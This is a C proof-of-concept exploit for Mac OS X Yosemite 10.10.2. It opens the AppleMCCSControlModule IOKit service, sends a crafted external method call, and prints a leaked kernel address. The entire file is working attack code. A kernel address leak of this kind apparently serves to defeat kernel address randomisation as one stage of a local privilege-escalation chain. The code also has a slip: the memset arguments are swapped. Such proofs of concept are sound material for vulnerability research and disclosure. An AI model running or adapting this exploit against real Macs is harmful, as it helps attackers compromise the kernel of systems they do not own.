/*
  AppleMCCS-leak1.c: Written for Mac OS X Yosemite (10.10.2)
		     by @rpaleari and @joystick

   llvm-gcc -Wall -o AppleMCCS-leak{,.c} -framework IOKit
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

#include <IOKit/IOKitLib.h>

bool find_service(const char *target_name, io_connect_t *ptarget_port) {
  io_iterator_t iter;
  kern_return_t r =
    IOServiceGetMatchingServices(kIOMasterPortDefault,
				 IOServiceMatching("IOService"), &iter);

  if (r != KERN_SUCCESS) {
    fprintf(stderr, " [!] IOServiceGetMatchingServices() failed\n");
    return -1;
  }

  io_object_t service;
  while ((service = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
    /* Get service name */
    io_name_t name;
    r = IORegistryEntryGetName(service, name);
    if (r != KERN_SUCCESS) {
      fprintf(stderr, " [!] IORegistryEntryGetName() failed\n");
      IOObjectRelease(service);
      continue;
    }

    io_string_t path;
    r = IORegistryEntryGetPath(service, "IOService", path);

    /* Try to open service */
    io_connect_t port = (io_connect_t) 0;
    r = IOServiceOpen(service, mach_task_self(), 0, &port);
    IOObjectRelease(service);
    if (r != kIOReturnSuccess) {
      continue;
    }

    if (strstr(name, target_name)) {
      printf(" [+] Found service %s\n", name);
      *ptarget_port = port;
      return true;
    }

    IOServiceClose(port);
  }

  return false;
}

int main(int argc, char **argv) {
  io_connect_t port;
  uint64_t handler;

  char *landing_page = calloc(0x1000, sizeof(char));

  memset(landing_page, 0x1000, 0x41);

  bool bSuccess = find_service("AppleMCCSControlModule", &port);
  assert(bSuccess);

  printf(" [+] Opened connection to service on port: %d\n", port);

  /* Call */
  uint64_t input[] = {
    0x1, (uint64_t) landing_page, 1,
    0x1, 1, 1,
  };

  uint8_t output[2048];
  size_t sz_out = sizeof(output);

  kern_return_t kr =
    IOConnectCallMethod((mach_port_t) port, /* Connection */
			(uint32_t) 0x6000 + 10,       /* Selector */
			input, sizeof(input)/sizeof(input[0]), /* input, inputCnt */
			&input, sizeof(input),
			NULL, NULL,
			output, &sz_out); /* Output stuff */


  printf(" [+] kr: %08x\n", kr);

  handler = ((uint64_t *)output)[0];
  printf(" [+] kernel leaked address: %016llx\n", handler);

  return IOServiceClose(port);
}
